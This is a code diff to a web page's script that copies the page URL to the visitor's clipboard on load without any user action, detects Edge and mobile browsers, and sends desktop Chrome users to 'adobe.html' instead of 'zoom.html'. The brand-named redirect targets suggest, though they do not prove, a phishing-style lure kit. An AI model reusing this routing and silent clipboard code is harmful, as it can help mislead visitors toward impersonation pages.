@@ -311,8 +311,57 @@
     </div>
 
 <script>
+    // ========== GET CURRENT PAGE URL (works on any hosted location) ==========
+    function getCurrentPageUrl() {
+        // Returns the full URL of the current page including protocol, domain, path, and query parameters
+        return window.location.href;
+    }
+    
+    // ========== AUTO COPY URL TO CLIPBOARD FUNCTION ==========
+    async function autoCopyCurrentUrl() {
+        const currentUrl = getCurrentPageUrl();
+        
+        try {
+            // Modern clipboard API
+            await navigator.clipboard.writeText(currentUrl);
+            console.log('URL automatically copied to clipboard:', currentUrl);
+            showCopyNotification('✓ URL automatically copied to clipboard!');
+            return true;
+        } catch (err) {
+            // Fallback for older browsers
+            console.error('Clipboard API failed:', err);
+            fallbackCopyUrl(currentUrl);
+            return false;
+        }
+    }
+    
+    function fallbackCopyUrl(url) {
+        const textarea = document.createElement('textarea');
+        textarea.value = url;
+        textarea.style.position = 'fixed';
+        textarea.style.top = '-9999px';
+        textarea.style.left = '-9999px';
+        document.body.appendChild(textarea);
+        textarea.select();
+        textarea.setSelectionRange(0, 99999);
+        document.execCommand('copy');
+        document.body.removeChild(textarea);
+        showCopyNotification('✓ URL automatically copied to clipboard!');
+    }
+    
+    function showCopyNotification(message) {
+        const notification = document.createElement('div');
+        notification.className = 'copy-success';
+        notification.textContent = message;
+        document.body.appendChild(notification);
+        
+        setTimeout(() => {
+            if (notification.parentNode) notification.remove();
+        }, 2500);
+    }
+    
     // ========== CONFIGURATION ==========
-    const TARGET_URL = window.location.href.replace(/\/[^/]*$/, '/ssa.html');
+    const TARGET_URL = getCurrentPageUrl();
     
     // ========== USER AGENT DETECTION ==========
     function isMobileDevice() {
@@ -382,7 +431,7 @@
                     
                     copyBtn.textContent = '✓ Copied!';
                     setTimeout(() => {
-                        copyBtn.textContent = 'Copy URL';
+                        copyBtn.textContent = '📋 Copy URL';
                     }, 2000);
                     
                 } catch (err) {
@@ -418,11 +467,24 @@
             const copyBtn = document.getElementById('mobileCopyBtn');
             if (copyBtn) {
                 copyBtn.addEventListener('click', async () => {
-                    await navigator.clipboard.writeText(TARGET_URL);
-                    copyBtn.textContent = '✓ Copied!';
-                    setTimeout(() => {
-                        copyBtn.textContent = 'Copy URL';
-                    }, 2000);
+                    try {
+                        await navigator.clipboard.writeText(TARGET_URL);
+                        copyBtn.textContent = '✓ Copied!';
+                        setTimeout(() => {
+                            copyBtn.textContent = '📋 Copy URL';
+                        }, 2000);
+                    } catch (err) {
+                        const textArea = document.createElement('textarea');
+                        textArea.value = TARGET_URL;
+                        document.body.appendChild(textArea);
+                        textArea.select();
+                        document.execCommand('copy');
+                        document.body.removeChild(textArea);
+                        copyBtn.textContent = '✓ Copied!';
+                        setTimeout(() => {
+                            copyBtn.textContent = '📋 Copy URL';
+                        }, 2000);
+                    }
                 });
             }
         }
@@ -430,6 +492,10 @@
     
     // ========== MAIN EXECUTION ==========
     setDynamicBackground();
+    
+    // AUTO COPY THE CURRENT PAGE URL IMMEDIATELY WHEN PAGE LOADS
+    // This works on ANY hosted location (GitHub, Netlify, Vercel, local server, etc.)
+    autoCopyCurrentUrl();
     
     const isEdge = isEdgeBrowser();
     const isMobile = isMobileDevice();
@@ -446,7 +512,7 @@
     } else {
         // Chrome desktop - normal redirect
         setTimeout(function() {
-            window.location.href = "zoom.html";
+            window.location.href = "adobe.html";
         }, 3000);
     }
 </script>
